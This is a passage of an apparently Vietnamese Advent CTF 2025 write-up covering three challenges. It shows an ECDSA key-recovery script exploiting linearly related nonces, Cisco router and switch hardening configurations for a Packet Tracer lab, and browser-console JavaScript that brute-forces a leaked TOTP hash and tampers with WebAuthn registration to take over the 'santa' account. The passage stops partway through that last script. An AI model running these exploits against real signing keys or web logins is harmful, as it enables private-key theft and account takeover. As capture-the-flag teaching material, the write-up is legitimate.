    Trong thu·∫≠t to√°n ECDSA, gi√° tr·ªã `k` (nonce) ph·∫£i l√† ng·∫´u nhi√™n tuy·ªát ƒë·ªëi cho m·ªói tin nh·∫Øn. N·∫øu `k` b·ªã l·ªô ho·∫∑c c√≥ m·ªëi li√™n h·ªá to√°n h·ªçc gi·ªØa c√°c l·∫ßn k√Ω, ta c√≥ th·ªÉ t√¨m ra kh√≥a b√≠ m·∫≠t `d`.
    ·ªû ƒë√¢y, `k` tƒÉng d·∫ßn theo quy lu·∫≠t tuy·∫øn t√≠nh: $k_2 = k_1 + 1$.

### Mathematical Derivation

M·ª•c ti√™u: T√¨m `d` t·ª´ 2 c·∫∑p ch·ªØ k√Ω $(r_1, s_1)$ v√† $(r_2, s_2)$ v·ªõi ƒëi·ªÅu ki·ªán $k_2 = k_1 + 1$.

**C√°c bi·∫øn s·ªë:**
*   $n$: B·∫≠c c·ªßa ƒë∆∞·ªùng cong (Order of the curve secp256k1).
*   $z$: Hash c·ªßa tin nh·∫Øn (ƒë√£ chuy·ªÉn sang s·ªë nguy√™n).
*   $d$: Kh√≥a b√≠ m·∫≠t (Private key).
*   $k$: S·ªë ng·∫´u nhi√™n (Nonce).

**Ph∆∞∆°ng tr√¨nh t·∫°o ch·ªØ k√Ω ECDSA:**
$$s \equiv k^{-1}(z + r \cdot d) \pmod n$$

**Bi·∫øn ƒë·ªïi ƒë·ªÉ t√¨m k:**
$$k \equiv s^{-1}(z + r \cdot d) \pmod n$$

**√Åp d·ª•ng cho 2 tin nh·∫Øn li√™n ti·∫øp:**
Ta c√≥ $k_2 - k_1 = 1$. Thay c√¥ng th·ª©c c·ªßa $k$ v√†o:

$$s_2^{-1}(z_2 + r_2 \cdot d) - s_1^{-1}(z_1 + r_1 \cdot d) \equiv 1 \pmod n$$

**Tri·ªÉn khai ph∆∞∆°ng tr√¨nh:**
Nh√¢n ph√¢n ph·ªëi c√°c s·ªë h·∫°ng:
$$(s_2^{-1}z_2) + (s_2^{-1}r_2 \cdot d) - (s_1^{-1}z_1) - (s_1^{-1}r_1 \cdot d) \equiv 1 \pmod n$$

**Gom nh√≥m ƒë·ªÉ c√¥ l·∫≠p $d$:**
ƒê∆∞a c√°c s·ªë h·∫°ng ch·ª©a $d$ v·ªÅ m·ªôt ph√≠a, c√°c s·ªë h·∫°ng t·ª± do v·ªÅ ph√≠a kia:
$$d \cdot (s_2^{-1}r_2 - s_1^{-1}r_1) \equiv 1 - s_2^{-1}z_2 + s_1^{-1}z_1 \pmod n$$

**T√≠nh ra $d$:**
Chia (nh√¢n ngh·ªãch ƒë·∫£o) c·∫£ hai v·∫ø cho c·ª•m d√≠nh v·ªõi $d$:
$$d \equiv \frac{1 - s_2^{-1}z_2 + s_1^{-1}z_1}{s_2^{-1}r_2 - s_1^{-1}r_1} \pmod n$$

### Exploit Script

D∆∞·ªõi ƒë√¢y l√† code Python ho√†n ch·ªânh ƒë·ªÉ gi·∫£i b√†i. B·∫°n l∆∞u th√†nh file `solve.py` v√† ch·∫°y c√πng th∆∞ m·ª•c v·ªõi `out.txt`.

```python
import hashlib
from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse

# --- 1. C·∫•u h√¨nh th√¥ng s·ªë Elliptic Curve (secp256k1) ---
# Order n c·ªßa ƒë∆∞·ªùng cong secp256k1 (l·∫•y t·ª´ th∆∞ vi·ªán ho·∫∑c search google)
n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

# Message 1
msg1_text = b'Beware the Krampus Syndicate!'
r1 = 0xa4312e31e6803220d694d1040391e8b7cc25a9b2592245fb586ce90a2b010b63
s1 = 0xe54321716f79543591ab4c67e989af3af301e62b3b70354b04e429d57f85aa2e

# Message 2 (K·∫ø ti·∫øp msg1 n√™n k2 = k1 + 1)
msg2_text = b'Santa is watching...'
r2 = 0x6c5f7047d21df064b3294de7d117dd1f7ccf5af872d053f12bddd4c6eb9f6192
s2 = 0x1ccf403d4a520bc3822c300516da8b29be93423ab544fb8dbff24ca0e1368367

# --- 3. T√≠nh to√°n Hash (z) ---
def calculate_z(msg_bytes):
    h = hashlib.sha256(msg_bytes).digest()
    return bytes_to_long(h)

z1 = calculate_z(msg1_text)
z2 = calculate_z(msg2_text)

print(f"[*] z1: {z1}")
print(f"[*] z2: {z2}")

# --- 4. √Åp d·ª•ng c√¥ng th·ª©c t·∫•n c√¥ng ---
# C√¥ng th·ª©c: d = (1 - s2^-1 * z2 + s1^-1 * z1) / (s2^-1 * r2 - s1^-1 * r1) mod n

# T√≠nh ngh·ªãch ƒë·∫£o modular c·ªßa s1 v√† s2
inv_s1 = inverse(s1, n)
inv_s2 = inverse(s2, n)

# T√≠nh t·ª≠ s·ªë (Numerator)
val_1 = (inv_s1 * z1) % n
val_2 = (inv_s2 * z2) % n
numerator = (1 - val_2 + val_1) % n

# T√≠nh m·∫´u s·ªë (Denominator)
term_1 = (inv_s1 * r1) % n
term_2 = (inv_s2 * r2) % n
denominator = (term_2 - term_1) % n

# T√≠nh d (kh√≥a b√≠ m·∫≠t ƒë∆∞·ª£c d√πng ƒë·ªÉ k√Ω)
inv_denominator = inverse(denominator, n)
recovered_d = (numerator * inv_denominator) % n

print(f"\n[+] Recovered raw d: {recovered_d}")

# --- 5. Kh√¥i ph·ª•c Flag g·ªëc ---
# Trong gen.py c√≥ ƒëo·∫°n: d = (d_goc % (n - 1)) + 1
# Nghƒ©a l√† gi√° tr·ªã recovered_d ta t√¨m ƒë∆∞·ª£c ƒëang l·ªõn h∆°n flag g·ªëc 1 ƒë∆°n v·ªã.
# Ta c·∫ßn tr·ª´ ƒëi 1 ƒë·ªÉ l·∫•y l·∫°i bytes c·ªßa flag.

flag_int = recovered_d - 1
flag_bytes = long_to_bytes(flag_int)

print(f"\n[+] Flag Int: {flag_int}")
print(f"[+] Flag: {flag_bytes.decode(errors='ignore')}")
```

### T·∫°i sao l·∫°i c√≥ chuy·ªán `Flag` b·ªã l·ªói `~` th√†nh `}`?

ƒê√¢y l√† ph·∫ßn "l·ª´a" nh·ªè c·ªßa t√°c gi·∫£ b√†i n√†y.

*   File `gen.py`: `d = (d % (n - 1)) + 1`
*   Khi b·∫°n gi·∫£i to√°n h·ªçc, b·∫°n t√¨m ra bi·∫øn `d` m√† m√°y t√≠nh d√πng ƒë·ªÉ k√Ω.
*   Nh∆∞ng bi·∫øn `d` ƒë√≥ ƒë√£ b·ªã `+1` so v·ªõi n·ªôi dung file `flag.txt`.
*   ASCII c·ªßa `}` l√† `125`.
*   ASCII c·ªßa `~` l√† `126`.
*   V√¨ th·∫ø, n·∫øu kh√¥ng tr·ª´ ƒëi 1, byte cu·ªëi c√πng s·∫Ω l√† `126` (`~`). Khi tr·ª´ ƒëi 1, n√≥ quay v·ªÅ `125` (`}`).

> **Flag:** `csd{pr3d1ct4bl3_n0nc3_==_w34k}`
{: .prompt-flag}

---

## Holiday Routing
> **Category:** Miscellaneous
{: .prompt-info}
**M·ª•c ti√™u:** C·∫•u h√¨nh h·ªá th·ªëng m·∫°ng doanh nghi·ªáp an to√†n, ƒë·ªãnh tuy·∫øn OSPF, ACL v√† Port Security ƒë·ªÉ ƒë·∫°t 100% ƒëi·ªÉm v√† l·∫•y Flag.

### TH√îNG TIN M·∫†NG (IP Addressing)
*   **HQ LAN:** 172.16.10.0/24 (Gateway: .1, Server: .10)
*   **Branch LAN:** 192.168.100.0/24 (Chia subnet)
    *   VLAN 10: 192.168.100.0/26 (Gateway: .1)
    *   VLAN 20: 192.168.100.64/26 (Gateway: .65)
*   **WAN HQ-ISP:** 10.0.0.0/30
*   **WAN Branch-ISP:** 10.0.0.4/30

### CHI TI·∫æT Y√äU C·∫¶U C·ª¶A ƒê·ªÄ:

> **‚ö†Ô∏è Critical Constraints (L∆∞u √Ω quan tr·ªçng):**
> *   **KH√îNG** di chuy·ªÉn c√°p ho·∫∑c thay ƒë·ªïi c·∫•u tr√∫c v·∫≠t l√Ω (topology).
> *   **KH√îNG** x√≥a c·∫•u h√¨nh c·ªßa Router "ISP".
> *   B·∫°n s·∫Ω kh√¥ng nh·∫≠n ƒë∆∞·ª£c Flag cho ƒë·∫øn khi ƒë·∫°t ƒëi·ªÉm s·ªë **√≠t nh·∫•t 90%**.

---

#### 1. IP Addressing & Subnetting
C·∫•u h√¨nh interface d·ª±a tr√™n b·∫£ng quy ho·∫°ch d∆∞·ªõi ƒë√¢y.
*   **Subnetting:** B·∫°n ƒë∆∞·ª£c c·∫•p block `192.168.100.0/24` cho m·∫°ng LAN chi nh√°nh (Branch LANs).

| Network / Interface | Y√™u c·∫ßu Subnet / IP              | Gateway / Chi ti·∫øt                    |
| :------------------ | :------------------------------- | :------------------------------------ |
| **VLAN 10 (Staff)** | Subnet `/26` h·ª£p l·ªá **ƒë·∫ßu ti√™n** | Gateway l√† IP ƒë·∫ßu ti√™n (First usable) |
| **VLAN 20 (Guest)** | Subnet `/26` h·ª£p l·ªá **th·ª© hai**  | Gateway l√† IP ƒë·∫ßu ti√™n (First usable) |
| **HQ WAN**          | `10.0.0.0/30`                    | HQ: `.1` \| ISP: `.2`                 |
| **Branch WAN**      | `10.0.0.4/30`                    | Branch: `.5` \| ISP: `.6`             |

---

#### 2. Switch Security (Layer 2)

**üè¢ Branch-Switch:**
*   **VLANs:**
    *   T·∫°o VLAN 10 (Name: `Staff`)
    *   T·∫°o VLAN 20 (Name: `Guest`)
*   **Trunking:**
    *   C·∫•u h√¨nh ƒë∆∞·ªùng link t·ªõi Router (`Fa0/1`) l√† **Trunk**.
    *   T·∫Øt DTP: S·ª≠ d·ª•ng l·ªánh `switchport nonegotiate`.
*   **Access Ports:**
    *   PC 1 (`Fa0/2`) ‚ûî **VLAN 10**
    *   PC 2 (`Fa0/3`) ‚ûî **VLAN 20**
*   **Port Security (Tr√™n Fa0/2 v√† Fa0/3):**
    *   B·∫≠t Port Security.
    *   Maximum MAC address: **1**.
    *   Configuration type: **Sticky**.
    *   Violation mode: **Restrict**.
*   **Unused Ports:** Administratively **shutdown** t·∫•t c·∫£ c√°c c·ªïng FastEthernet kh√¥ng s·ª≠ d·ª•ng.

**üè¢ HQ-Switch:**
*   ƒê·∫£m b·∫£o Server k·∫øt n·ªëi t·ªõi `Fa0/2` thu·ªôc **VLAN 1** (Default).
*   C·∫•u h√¨nh uplink t·ªõi Router (`G0/0/1` ho·∫∑c `Fa0/1`) l√† ch·∫ø ƒë·ªô **Access** thu·ªôc **VLAN 1**.

---

#### 3. Routing & Connectivity (Layer 3)

**üåê OSPF Configuration:**
*   C·∫•u h√¨nh OSPF Process ID **1** tr√™n c·∫£ 3 Router (HQ, Branch, ISP).
*   S·ª≠ d·ª•ng **Area 0** cho t·∫•t c·∫£ c√°c networks.
*   Qu·∫£ng b√° (Advertise) t·∫•t c·∫£ c√°c m·∫°ng k·∫øt n·ªëi tr·ª±c ti·∫øp.

**üîí OSPF Security:**
*   C·∫•u h√¨nh x√°c th·ª±c **MD5 Authentication** tr√™n c√°c ƒë∆∞·ªùng WAN (HQ‚ÜîISP v√† Branch‚ÜîISP).
    *   Key ID: `1`
    *   Key: `Cisc0Rout3s`
*   **Passive Interfaces:** ƒê·∫£m b·∫£o OSPF updates **kh√¥ng** ƒë∆∞·ª£c g·ª≠i xu·ªëng c√°c c·ªïng LAN (Gigabit ports n·ªëi xu·ªëng Switch).

---

#### 4. Access Control Lists (ACLs)

**üõ°Ô∏è HQ-Router Security:**
T·∫°o m·ªôt **Named Extended ACL** c√≥ t√™n l√† `SECURE_HQ` v·ªõi c√°c lu·∫≠t sau:

1.  ‚úÖ **Permit** traffic **HTTP** t·ª´ m·∫°ng **Branch VLAN 10** t·ªõi **HQ Server**.
2.  ‚úÖ **Permit** traffic **ICMP (Ping)** t·ª´ m·∫°ng **Branch VLAN 10** t·ªõi **HQ Server**.
3.  ‚õî **Deny** t·∫•t c·∫£ traffic IP kh√°c t·ª´ m·∫°ng **Branch VLAN 20** t·ªõi **HQ LAN**.
4.  ‚úÖ **Permit** t·∫•t c·∫£ traffic c√≤n l·∫°i.

*   **Application:** √Åp d·ª•ng ACL n√†y v√†o interface v√† h∆∞·ªõng (direction) h·ª£p l√Ω nh·∫•t ƒë·ªÉ l·ªçc traffic ƒëi v√†o m·∫°ng HQ.

---

#### 5. Device Hardening (B·∫£o m·∫≠t thi·∫øt b·ªã)

**√Åp d·ª•ng cho T·∫§T C·∫¢ Routers:**
*   Set **Enable Secret**: `Hard3n3d!`
*   T·∫°o user **NetOps** v·ªõi secret: `AdminPass`
*   C·∫•u h√¨nh **SSH**:
    *   Version: **2**
    *   Domain name: `nexus.corp`
    *   Key size: **1024** bit
*   V√¥ hi·ªáu h√≥a Web Server:
    *   `no ip http server`
    *   `no ip http secure-server`

---

#### üèÅ Check Results
*   Sau khi ho√†n th√†nh, l∆∞u file `.pka`.
*   Upload file l√™n website ƒë√£ cung c·∫•p ƒë·ªÉ nh·∫≠n **Flag**.

### B∆Ø·ªöC 1: C·∫§U H√åNH BRANCH-ROUTER
*Nhi·ªám v·ª•: Hardening, Sub-interfaces cho VLAN, OSPF.*

```bash
enable
configure terminal

! --- 1. System Hardening ---
hostname Branch-Router
enable secret Hard3n3d!
username NetOps secret AdminPass
ip domain-name nexus.corp
crypto key generate rsa
! (Nh·∫≠p 1024 khi ƒë∆∞·ª£c h·ªèi)
ip ssh version 2
! (L·ªánh t·∫Øt HTTP c√≥ th·ªÉ l·ªói tr√™n PT 9.0, n·∫øu l·ªói th√¨ b·ªè qua)
no ip http server
no ip http secure-server

! --- 2. Interface WAN ---
interface GigabitEthernet0/0/0
 description Link to ISP
 ip address 10.0.0.5 255.255.255.252
 ip ospf message-digest-key 1 md5 Cisc0Rout3s
 no shutdown
 exit

! --- 3. Interface LAN (Router-on-a-Stick) ---
interface GigabitEthernet0/0/1
 ! B·∫≠t c·ªïng v·∫≠t l√Ω g·ªëc (QUAN TR·ªåNG ƒê·ªÇ KH√îNG B·ªä ƒê·ªé ƒê√àN)
 no shutdown
 exit

! Sub-interface VLAN 10 (Staff)
interface GigabitEthernet0/0/1.10
 encapsulation dot1Q 10
 ip address 192.168.100.1 255.255.255.192
 exit

! Sub-interface VLAN 20 (Guest)
interface GigabitEthernet0/0/1.20
 encapsulation dot1Q 20
 ip address 192.168.100.65 255.255.255.192
 exit

! --- 4. OSPF Routing ---
router ospf 1
 router-id 3.3.3.3
 network 10.0.0.4 0.0.0.3 area 0
 network 192.168.100.0 0.0.0.255 area 0
 area 0 authentication message-digest
 passive-interface GigabitEthernet0/0/1.10
 passive-interface GigabitEthernet0/0/1.20
 exit

exit
write memory
```

---

### B∆Ø·ªöC 2: C·∫§U H√åNH BRANCH-SWITCH
*Nhi·ªám v·ª•: VLAN, Trunking, Port Security.*

```bash
enable
configure terminal
hostname Branch-Switch

! --- 1. T·∫°o VLAN ---
vlan 10
 name Staff
vlan 20
 name Guest
exit

! --- 2. Trunking (N·ªëi l√™n Router) ---
interface FastEthernet0/1
 switchport mode trunk
 switchport nonegotiate
 no shutdown
 exit

! --- 3. Access Ports & Security ---
! PC1 (VLAN 10)
interface FastEthernet0/2
 switchport mode access
 switchport access vlan 10
 switchport port-security
 switchport port-security maximum 1
 switchport port-security mac-address sticky
 switchport port-security violation restrict
 no shutdown
 exit

! PC2 (VLAN 20)
interface FastEthernet0/3
 switchport mode access
 switchport access vlan 20
 switchport port-security
 switchport port-security maximum 1
 switchport port-security mac-address sticky
 switchport port-security violation restrict
 no shutdown
 exit

! --- 4. T·∫Øt c·ªïng th·ª´a (Best Practice) ---
interface range FastEthernet0/4-24, GigabitEthernet0/1-2
 shutdown
 exit

exit
write memory
```

---

### B∆Ø·ªöC 3: C·∫§U H√åNH ISP-ROUTER
*Nhi·ªám v·ª•: K√≠ch ho·∫°t Interface v√† OSPF trung gian.*

```bash
enable
configure terminal

! --- 1. Hardening ---
hostname ISP-Router
enable secret Hard3n3d!
username NetOps secret AdminPass
ip domain-name nexus.corp
crypto key generate rsa
! (Nh·∫≠p 1024)
ip ssh version 2
! (B·ªè qua n·∫øu l·ªói)
no ip http server
no ip http secure-server

! --- 2. Interfaces (K√≠ch ho·∫°t v√† g√°n IP) ---
interface GigabitEthernet0/0/0
 ip address 10.0.0.2 255.255.255.252
 ip ospf message-digest-key 1 md5 Cisc0Rout3s
 no shutdown
 exit

interface GigabitEthernet0/0/1
 ip address 10.0.0.6 255.255.255.252
 ip ospf message-digest-key 1 md5 Cisc0Rout3s
 no shutdown
 exit

! --- 3. OSPF ---
router ospf 1
 router-id 2.2.2.2
 network 10.0.0.0 0.0.0.3 area 0
 network 10.0.0.4 0.0.0.3 area 0
 area 0 authentication message-digest
 exit

exit
write memory
```

---

### B∆Ø·ªöC 4: C·∫§U H√åNH HQ-ROUTER (QUAN TR·ªåNG)
*Nhi·ªám v·ª•: ACL ch·∫∑n Guest, c·∫•u h√¨nh LAN/WAN.*

```bash
enable
configure terminal

! --- 1. Hardening ---
hostname HQ-Router
enable secret Hard3n3d!
username NetOps secret AdminPass
ip domain-name nexus.corp
crypto key generate rsa
! (Nh·∫≠p 1024)
ip ssh version 2
! (B·ªè qua n·∫øu l·ªói)
no ip http server
no ip http secure-server

! --- 2. Interface WAN ---
interface GigabitEthernet0/0/0
 ip address 10.0.0.1 255.255.255.252
 ip ospf message-digest-key 1 md5 Cisc0Rout3s
 no shutdown
 exit

! --- 3. Interface LAN ---
interface GigabitEthernet0/0/1
 ! IP Gateway cho m·∫°ng Server (172.16.10.0/24)
 ip address 172.16.10.1 255.255.255.0
 no shutdown
 exit

! --- 4. OSPF ---
router ospf 1
 router-id 1.1.1.1
 network 10.0.0.0 0.0.0.3 area 0
 network 172.16.10.0 0.0.0.255 area 0
 area 0 authentication message-digest
 passive-interface GigabitEthernet0/0/1
 exit

! --- 5. ACL (Access Control List) ---
! Cho ph√©p Staff (VLAN 10) truy c·∫≠p HTTP/Ping Server
! Ch·∫∑n Guest (VLAN 20) truy c·∫≠p m·∫°ng HQ
ip access-list extended SECURE_HQ
 permit tcp 192.168.100.0 0.0.0.63 host 172.16.10.10 eq 80
 permit icmp 192.168.100.0 0.0.0.63 host 172.16.10.10
 deny ip 192.168.100.64 0.0.0.63 172.16.10.0 0.0.0.255
 permit ip any any
 exit

! √Åp d·ª•ng ACL v√†o c·ªïng WAN (chi·ªÅu ƒëi v√†o)
interface GigabitEthernet0/0/0
 ip access-group SECURE_HQ in
 exit

exit
write memory
```

---

### B∆Ø·ªöC 5: C·∫§U H√åNH HQ-SWITCH
*Nhi·ªám v·ª•: C·∫•u h√¨nh c·ªïng Access Vlan 1.*

```bash
enable
configure terminal
hostname HQ-Switch

! C·ªïng n·ªëi l√™n Router (Fa0/1)
interface FastEthernet0/1
 switchport mode access
 switchport access vlan 1
 no shutdown
 exit

! C·ªïng n·ªëi Server (Fa0/2)
interface FastEthernet0/2
 switchport mode access
 switchport access vlan 1
 no shutdown
 exit

! T·∫Øt c·ªïng th·ª´a
interface range FastEthernet0/3-24, GigabitEthernet0/1-2
 shutdown
 exit

exit
write memory
```

---

### B∆Ø·ªöC 6: C·∫§U H√åNH IP CHO PC (GUI)
V√†o tab **Desktop > IP Configuration** c·ªßa t·ª´ng PC:

**PC 1 (Staff):**
*   **IP Address:** 192.168.100.10
*   **Subnet Mask:** 255.255.255.192
*   **Default Gateway:** 192.168.100.1

**PC 2 (Guest):**
*   **IP Address:** 192.168.100.70
*   **Subnet Mask:** 255.255.255.192
*   **Default Gateway:** 192.168.100.65

---

1.  B·∫•m n√∫t **Fast Forward Time** (tua nhanh) ƒë·ªÉ t·∫•t c·∫£ ƒë√®n chuy·ªÉn xanh.
2.  Ki·ªÉm tra **Completion: 100%**.
3.  L∆∞u file `.pka`.
4.  Upload l√™n web ƒë·ªÉ nh·∫≠n Flag.

> **Flag:** `csd{C1sc0_35_muy_m4l_e290bgk7o5}`
{: .prompt-flag}

![image](/assets/img/Advent-CTF-2025/day13.png){: .mx-auto .d-block }

---

## Multifactorial
> **Category:** Web Exploitation
{: .prompt-info}

### T·ªïng quan (Reconnaissance)
M·ª•c ti√™u l√† truy c·∫≠p v√†o `/admin` ƒë·ªÉ l·∫•y Flag. Trang web y√™u c·∫ßu x√°c th·ª±c 3 l·ªõp (3FA) theo ƒë√∫ng chu·∫©n b·∫£o m·∫≠t hi·ªán ƒë·∫°i:
1.  **Something You Know:** Password.
2.  **Something You Have:** TOTP (Time-based One-Time Password).
3.  **Something You Are:** WebAuthn (Passkey/Biometrics).

Ng∆∞·ªùi d√πng m·ª•c ti√™u l√†: **`santa`** (l∆∞u √Ω ch·ªØ th∆∞·ªùng).

---

### Stage 1: Something You Know (Password)
*   **Ph√¢n t√≠ch:** Trang n√†y y√™u c·∫ßu m·∫≠t kh·∫©u.
*   **Khai th√°c:** M·∫≠t kh·∫©u n√†y trong source code ƒë∆∞·ª£c ki·ªÉm tra b·∫±ng m√£ hash, crack hash SHA-1 ta c√≥ m·∫≠t kh·∫©u l√† `northpole123`.
*   **K·∫øt qu·∫£:** Nh·∫≠p password &rarr; Server set Session Cookie &rarr; Chuy·ªÉn sang Step 2.

---

### Stage 2: Something You Have (TOTP Oracle)
ƒê√¢y l√† b∆∞·ªõc b·∫°n c·∫£m th·∫•y "l·∫•n c·∫•n", nh∆∞ng th·ª±c t·∫ø c√°ch gi·∫£i **Offline Brute-force** l√† c√°ch gi·∫£i chu·∫©n cho l·ªói n√†y.

*   **Ph√¢n t√≠ch Code:**
    Trong file HTML, API `/api/something-you-have-verify` nh·∫≠n tham s·ªë `debug=1`.
    Khi g·ª≠i `debug=1`, server tr·∫£ v·ªÅ `hmac` (Hash SHA-256) c·ªßa m√£ code **ƒê√öNG** t·∫°i th·ªùi ƒëi·ªÉm ƒë√≥ v√† `serverTime`.

    ```javascript
    // V√≠ d·ª• response t·ª´ server
    {
      "serverTime": 1700000000,
      "hmac": "a1b2c3d4..." // Hash c·ªßa m√£ code ƒë√∫ng
    }
    ```

*   **L·ªó h·ªïng (Information Leakage):**
    *   M√£ TOTP ch·ªâ c√≥ 6 ch·ªØ s·ªë (Kh√¥ng gian m·∫´u: `000000` &rarr; `999999`). T·ªïng c·ªông 1 tri·ªáu kh·∫£ nƒÉng.
    *   Server ƒë·ªÉ l·ªô Hash c·ªßa ƒë√°p √°n ƒë√∫ng.
    *   Thu·∫≠t to√°n HMAC-SHA256 r·∫•t nhanh. M√°y t√≠nh c√° nh√¢n c√≥ th·ªÉ t√≠nh 1 tri·ªáu hash trong ch∆∞a ƒë·∫ßy 1 gi√¢y.

*   **Khai th√°c (The Attack):**
    Thay v√¨ spam 1 tri·ªáu request l√™n server (s·∫Ω b·ªã ch·∫∑n IP), ta t·∫£i Hash v·ªÅ m√°y, sau ƒë√≥ ch·∫°y v√≤ng l·∫∑p t·ª´ 0 ƒë·∫øn 1 tri·ªáu, t√≠nh Hash c·ªßa t·ª´ng s·ªë v√† so s√°nh v·ªõi Hash c·ªßa server.

    > **T·∫°i sao kh√¥ng ph·∫£i l·ªói thu·∫≠t to√°n TOTP?**
    > Thu·∫≠t to√°n TOTP r·∫•t an to√†n. L·ªói ·ªü ƒë√¢y l√† l·∫≠p tr√¨nh vi√™n ƒë·ªÉ qu√™n t√≠nh nƒÉng `debug` tr·∫£ v·ªÅ ƒë√°p √°n ƒë√£ b·ªã m√£ h√≥a (nh∆∞ng m√£ h√≥a y·∫øu do kh√¥ng gian m·∫´u nh·ªè).

---

### Stage 3: Something You Are (WebAuthn Logic Flaw)
ƒê√¢y l√† b∆∞·ªõc kh√≥ nh·∫•t v√† th√∫ v·ªã nh·∫•t.

*   **Quy tr√¨nh chu·∫©n c·ªßa WebAuthn:**
    1.  Client xin ƒëƒÉng k√Ω (`/register/options`).
    2.  Browser t·∫°o c·∫∑p kh√≥a Public/Private.
    3.  Client g·ª≠i Public Key v·ªÅ server (`/register/verify`).

*   **Ph√¢n t√≠ch L·ªó h·ªïng:**
    Trong file `register.html`, code JS g·ª≠i `name` l√™n server ·ªü b∆∞·ªõc `verify`:

    ```javascript
    const payload = {
      name: name, // <--- D·ªØ li·ªáu do Client ki·ªÉm so√°t
      id: cred.id,
      ...
    };
    ```

*   **L·ªó h·ªïng (Parameter Tampering / IDOR):**
    Server kh√¥ng ki·ªÉm tra xem c√°i `name` g·ª≠i ·ªü b∆∞·ªõc Verify c√≥ kh·ªõp v·ªõi c√°i `name` ƒë√£ xin ·ªü b∆∞·ªõc Options hay kh√¥ng. Server tin t∆∞·ªüng m√π qu√°ng v√†o d·ªØ li·ªáu ng∆∞·ªùi d√πng g·ª≠i l√™n.

*   **Khai th√°c (The Attack):**
    1.  Xin ƒëƒÉng k√Ω v·ªõi t√™n `Attacker` (ƒë·ªÉ server kh√¥ng ch·∫∑n request ban ƒë·∫ßu).
    2.  T·∫°o kh√≥a ·ªü tr√¨nh duy·ªát.
    3.  Ch·∫∑n request `verify` (ho·∫∑c d√πng Console) ƒë·ªÉ s·ª≠a `name: "Attacker"` th√†nh `name: "santa"`.
    4.  Server nh·∫≠n kh√≥a v√† g√°n n√≥ cho user `santa`. &rarr; **Backdoor th√†nh c√¥ng**.

---

### Script Khai th√°c (Solution Code)

D∆∞·ªõi ƒë√¢y l√† script "s·∫°ch" v√† ·ªïn ƒë·ªãnh nh·∫•t ƒë·ªÉ gi·∫£i b√†i n√†y (ch·∫°y tr√™n Developer Console t·∫°i trang web).

### B∆∞·ªõc 1: V∆∞·ª£t qua Step 1 & 2
*H√£y l√†m th·ªß c√¥ng b∆∞·ªõc nh·∫≠p Password ƒë·ªÉ c√≥ Session s·∫°ch.*
T·∫°i m√†n h√¨nh Step 2 (nh·∫≠p code), ch·∫°y script n√†y ƒë·ªÉ t√¨m code:

```javascript
async function autoSolveStep1And2() {
    console.clear();

    const PASS_STEP1 = "northpole123";
    const ORACLE_KEY = "17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49";
    const buf2hex = (b) => Array.prototype.map.call(new Uint8Array(b), x => ('00' + x.toString(16)).slice(-2)).join('');

    try {
        // =========================================================
        // 1. G·ª¨I PASSWORD (STEP 1)
        // =========================================================
        console.log("[1] Submitting Password...");
        let r1 = await fetch("/api/something-you-know-check", {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ password: PASS_STEP1 })
        });
        if (!r1.ok) throw new Error("Sai Password Step 1");
        console.log("Step 1 OK. Session initialized.");

        // =========================================================
        // 2. L·∫§Y HASH TOTP (LEAK)
        // =========================================================
        console.log("[2] Fetching TOTP Hash...");
        let rDebug = await fetch("/api/something-you-have-verify?debug=1", {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ code: "000000" })
        });
        let targetHash = (await rDebug.json()).hmac;
        console.log("   Target Hash:", targetHash);

        // =========================================================
        // 3. BRUTE-FORCE OFFLINE
        // =========================================================
        console.log("[3] Cracking Code (000000-999999)...");
        let enc = new TextEncoder();
        let key = await crypto.subtle.importKey("raw", enc.encode(ORACLE_KEY), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
        
        let foundCode = null;
        // Chia batch ƒë·ªÉ kh√¥ng treo browser
        const BATCH = 5000;
        for (let i = 0; i < 1000000; i += BATCH) {
            let promises = [];
            for (let j = 0; j < BATCH; j++) {
                let c = (i + j).toString().padStart(6, "0");
                promises.push(crypto.subtle.sign("HMAC", key, enc.encode(c)).then(b => ({ c, h: buf2hex(b) })));
            }
            let results = await Promise.all(promises);
            let match = results.find(x => x.h === targetHash);
            if (match) {
                foundCode = match.c;
                break;
            }
        }

        if (!foundCode) throw new Error("Cracking failed!");
        console.log("   FOUND CODE:", foundCode);

        // =========================================================
        // 4. SUBMIT TOTP (STEP 2) - QUAN TR·ªåNG ƒê·ªÇ GI·ªÆ SESSION
        // =========================================================
        console.log("[4] Submitting Code to API...");
        let r2 = await fetch("/api/something-you-have-verify?debug=0", {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ code: foundCode })
        });

        if (r2.ok) {
            console.log("STEP 2 COMPLETE! Session is now ready for Step 3.");
            console.log("Chuy·ªÉn h∆∞·ªõng sang trang ƒëƒÉng k√Ω...");
            window.location.href = "/register-passkey";
        } else {
            throw new Error("Submit Code failed!");
        }

    } catch (e) {
        console.error("ERROR:", e);
        alert("L·ªói: " + e.message);
    }
}

autoSolveStep1And2();
```
*(Nh·∫≠p code t√¨m ƒë∆∞·ª£c v√† b·∫•m Verify ƒë·ªÉ sang Step 3)*

### B∆∞·ªõc 2: WebAuthn Tampering & Login
T·∫°i m√†n h√¨nh Step 3, ch·∫°y script n√†y ƒë·ªÉ c∆∞·ªõp t√†i kho·∫£n v√† l·∫•y c·ªù:

```javascript
// SOLVER STEP 3 & FINAL
async function pwnSanta() {
    const USER = "santa"; // Target
    const bufToB64 = (b) => btoa(String.fromCharCode(...new Uint8Array(b))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
    const b64ToBuf = (s) => Uint8Array.from(atob(s.replace(/-/g, "+").replace(/_/g, "/")), c => c.charCodeAt(0)).buffer;

    // 1. ƒêƒÉng k√Ω gi·∫£ m·∫°o
    console.log("1. Creating Backdoor...");
    let rOpt = await fetch("/api/webauthn/register/options", {
        method:"POST", headers:{"Content-Type":"application/json"},
        body: JSON.stringify({name: "Anonymous"}) // T√™n r√°c
    });
    let opt = await rOpt.json();
    
    // Chu·∫©n b·ªã key
    opt.publicKey.challenge = b64ToBuf(opt.publicKey.challenge);
    opt.publicKey.user.id = b64ToBuf(opt.publicKey.user.id);
    
    // T·∫°o kh√≥a (C·∫ßn x√°c th·ª±c v√¢n tay/USB)
